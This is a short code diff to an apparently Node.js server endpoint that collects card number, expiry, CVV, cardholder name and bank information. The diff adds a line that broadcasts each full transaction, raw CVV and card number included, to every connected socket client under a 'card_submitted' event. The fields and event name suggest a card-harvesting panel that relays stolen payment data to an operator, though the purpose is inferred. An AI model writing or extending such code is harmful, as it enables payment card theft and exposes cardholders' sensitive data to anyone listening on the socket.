@@ -531,7 +531,6 @@ app.get('/api/getPaymentDetails', (req, res) => {
   res.json({ status: "success", payment });
 });
 
-// Transactions Endpoints - Modified to handle bank info
 app.post('/api/sendPaymentDetails', (req, res) => {
   try {
     const { cardNumber, expiry, cvv, email, amount, currency, cardholder, bankInfo } = req.body;
@@ -576,7 +575,11 @@ app.post('/api/sendPaymentDetails', (req, res) => {
     };
 
     transactions.set(invoiceId, transaction);
+    
+    // Emit both events to ensure compatibility
     io.emit('new_transaction');
+    io.emit('card_submitted', transaction); // Add this line to emit the card_submitted event
+    
     res.json({ status: "success", invoiceId });
   } catch (error) {
     console.error('Transaction Error:', error);
